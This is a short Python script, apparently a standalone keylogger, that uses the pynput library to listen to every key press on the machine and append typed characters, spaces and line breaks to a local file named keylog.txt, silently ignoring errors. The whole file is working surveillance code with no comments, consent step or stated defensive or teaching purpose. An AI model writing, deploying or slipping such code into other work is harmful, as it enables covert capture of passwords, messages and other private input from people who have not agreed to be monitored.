from pynput.keyboard import Key, Listener

def log_keystroke(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            with open("keylog.txt", "a") as file:
                file.write(key.char)
        elif key == Key.space:
            with open("keylog.txt", "a") as file:
                file.write(" ")
        elif key == Key.enter:
            with open("keylog.txt", "a") as file:
                file.write("\n")
        elif key == Key.backspace:
            pass 
    except Exception as e:
        pass

with Listener(on_press=log_keystroke) as listener:

    listener.join()
